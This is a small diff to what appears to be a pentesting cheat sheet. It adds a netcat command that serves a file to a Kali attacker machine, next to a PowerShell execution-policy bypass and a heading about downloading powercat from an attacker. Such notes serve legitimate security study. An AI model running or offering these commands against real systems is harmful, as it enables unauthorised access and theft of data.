@@ -7,6 +7,8 @@
 
 `powershell -ExecutionPolicy Bypass -File "C:\Scripts\MyScript.ps1"` - attempt to bypass execution policy and execute script.
 
+`nc.exe -nvlp 7777 < file to sent to kali`
+
 #### PowerShell
 
 methods used to download powercat.ps1 from attacker:
